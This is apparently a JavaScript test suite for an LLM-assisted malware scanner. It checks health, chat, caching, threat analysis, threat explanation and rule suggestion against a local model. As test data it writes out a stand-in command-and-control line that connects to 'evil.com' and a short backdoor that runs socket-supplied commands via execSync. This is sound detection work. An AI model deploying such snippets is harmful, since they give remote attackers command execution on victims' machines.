const assert = require('assert');
const path = require('path');
const fs = require('fs');

const { LlmClient } = require('../../out/llm/llm-client');
const { LlmCache } = require('../../out/llm/llm-cache');
const { PromptBuilder } = require('../../out/llm/prompt-builder');
const { LlmAnalysisEngine } = require('../../out/scanner/engines/llm-analysis-engine');
const { Scanner } = require('../../out/scanner/scanner');

const SAMPLES_DIR = path.resolve(__dirname, '..', '..', '..', 'samples');
const PROMPTS_DIR = path.resolve(__dirname, '..', '..', 'prompts');

const LLM_CONFIG = {
  enabled: true,
  provider: 'lmstudio',
  baseUrl: 'http://localhost:1234/v1',
  model: 'gemma-4-12b-it-qat@q4_k_xl',
  apiKey: 'lm-studio',
  maxTokens: 1024,
  temperature: 0.1,
  autoAnalyze: false,
  timeout: 60000,
  promptProfile: 'Security Analysis',
};

function createEngine(promptProfile) {
  const client = new LlmClient(LLM_CONFIG);
  const cache = new LlmCache();
  const promptBuilder = new PromptBuilder();
  promptBuilder.loadTemplatesFromDirectory(PROMPTS_DIR);
  return new LlmAnalysisEngine(client, cache, promptBuilder, promptProfile || LLM_CONFIG.promptProfile);
}

suite('LLM Integration Tests', () => {

  test('LLM Health Check', function () {
    this.timeout(60000);
    const client = new LlmClient(LLM_CONFIG);
    return client.checkHealth().then((health) => {
      assert.strictEqual(health.ok, true, 'Health check should be ok');
      assert(Array.isArray(health.models), 'models should be an array');
      assert(
        health.models.some((m) => m.includes('gemma-4-12b-it-qat')),
        'models array should contain gemma-4-12b-it-qat'
      );
    });
  });

  test('LLM Chat', function () {
    this.timeout(60000);
    const client = new LlmClient(LLM_CONFIG);
    return client.chat(
      'You are a helpful assistant. Reply concisely.',
      'Say "hello world" and nothing else.'
    ).then((response) => {
      assert(response.content && response.content.length > 0, 'Response should have non-empty content');
      assert(response.model && response.model.length > 0, 'Response should have a model name');
      assert(response.promptTokens > 0, 'promptTokens should be > 0');
      assert(response.completionTokens > 0, 'completionTokens should be > 0');
    });
  });

  test('LLM Cache End-to-End', function () {
    this.timeout(60000);
    const engine = createEngine();
    const samplePath = path.join(SAMPLES_DIR, 'stage2-backdoors', 'ottercookie', 'ottercookie-v1.js');
    const content = fs.readFileSync(samplePath, 'utf-8');

    // First call — should NOT come from cache
    return engine.analyzeFile(samplePath, content).then((first) => {
      assert.strictEqual(first.result.fromCache, false, 'First call should not be from cache');

      // Second call — same content, should come from cache
      return engine.analyzeFile(samplePath, content).then((second) => {
        assert.strictEqual(second.result.fromCache, true, 'Second call should be from cache');
      });
    });
  });

  test('LLM Analyze Malicious', function () {
    this.timeout(60000);
    const engine = createEngine('Security Analysis');
    const samplePath = path.join(SAMPLES_DIR, 'stage2-backdoors', 'ottercookie', 'ottercookie-v1.js');
    const content = fs.readFileSync(samplePath, 'utf-8');

    return engine.analyzeFile(samplePath, content).then(({ threats, result }) => {
      assert(result !== null && result !== undefined, 'Analysis result should not be null');
      assert(typeof result.malicious === 'boolean', 'Result should have a malicious boolean field');
      assert(Array.isArray(threats), 'Threats should be an array');
      assert(result.summary && result.summary.length > 0, 'Result should have a non-empty summary');
      assert(result.model && result.model.length > 0, 'Result should have a model name');
    });
  });

  test('LLM Analyze Clean', function () {
    this.timeout(60000);
    const engine = createEngine('Security Analysis');
    const cleanCode = `const express = require('express');
const app = express();

app.get('/', (req, res) => {
  res.send('Hello World');
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});`;

    return engine.analyzeFile('server.js', cleanCode).then(({ threats, result }) => {
      const isClean = !result.malicious || threats.length === 0;
      assert(isClean, 'Clean code should not be flagged as malicious');
    });
  });

  test('LLM Explain Threat', function () {
    this.timeout(60000);
    const engine = createEngine();
    return engine.explainThreat(
      'malicious.js',
      'C2 Communication',
      'Socket.io connection to external server for command and control',
      "const socket = io.connect('ws://evil.com:9999');"
    ).then((explanation) => {
      assert(typeof explanation === 'string', 'Explanation should be a string');
      assert(explanation.length > 0, 'Explanation should be non-empty');
    });
  });

  test('LLM Suggest Rule', function () {
    this.timeout(60000);
    const engine = createEngine();
    const maliciousCode = `const io = require('socket.io-client');
const socket = io.connect('ws://127.0.0.1:9999');
socket.on('command', (cmd) => {
  const { execSync } = require('child_process');
  execSync(cmd);
});`;

    return engine.suggestRule('backdoor.js', maliciousCode).then((ruleJson) => {
      assert(typeof ruleJson === 'string', 'Rule should be a string');
      assert(ruleJson.length > 0, 'Rule should be non-empty');

      // Try to extract JSON from the response
      let parsed;
      try {
        parsed = JSON.parse(ruleJson);
      } catch {
        const match = ruleJson.match(/\{[\s\S]*\}/);
        assert(match, 'Response should contain JSON');
        parsed = JSON.parse(match[0]);
      }

      assert(parsed.id, 'Rule should have an id field');
      assert(parsed.name, 'Rule should have a name field');
      assert(parsed.severity, 'Rule should have a severity field');
    });
  });

  test('LLM Prompt Templates End-to-End', function () {
    this.timeout(120000);
    const client = new LlmClient(LLM_CONFIG);
    const promptBuilder = new PromptBuilder();
    promptBuilder.loadTemplatesFromDirectory(PROMPTS_DIR);

    const templateNames = promptBuilder.getTemplateNames();
    assert(templateNames.length >= 4, `Should load at least 4 templates, got ${templateNames.length}`);

    const samplePath = path.join(SAMPLES_DIR, 'stage2-backdoors', 'ottercookie', 'ottercookie-v1.js');
    const code = fs.readFileSync(samplePath, 'utf-8');
    const truncatedCode = promptBuilder.truncateCode(code);

    const testCases = [
      {
        name: 'Security Analysis',
        vars: { code: truncatedCode, filename: 'ottercookie-v1.js', language: 'javascript' },
      },
      {
        name: 'Contagious Interview Analysis',
        vars: { code: truncatedCode, filename: 'ottercookie-v1.js', language: 'javascript' },
      },
      {
        name: 'Explain Threat',
        vars: {
          filename: 'ottercookie-v1.js',
          rule_name: 'C2 Communication',
          description: 'Socket.io C2 channel',
          evidence: "const socket = io.connect('ws://evil.com:9999');",
        },
      },
      {
        name: 'Suggest Rule',
        vars: { code: truncatedCode, filename: 'ottercookie-v1.js', language: 'javascript' },
      },
    ];

    // Verify all templates exist
    for (const tc of testCases) {
      assert(promptBuilder.hasTemplate(tc.name), `Template "${tc.name}" should be loaded`);
    }

    // Send each template to the LLM sequentially
    let chain = Promise.resolve();
    for (const tc of testCases) {
      chain = chain.then(() => {
        const prompt = promptBuilder.buildPrompt(tc.name, tc.vars);
        assert(prompt, `buildPrompt should return a result for "${tc.name}"`);
        return client.chat(prompt.systemPrompt, prompt.userPrompt, {
          maxTokens: prompt.maxTokens,
          temperature: prompt.temperature,
        }).then((response) => {
          assert(response.content && response.content.length > 0,
            `Template "${tc.name}" should return non-empty content`);
          assert(response.model, `Template "${tc.name}" should return a model name`);
        });
      });
    }

    return chain;
  });
});
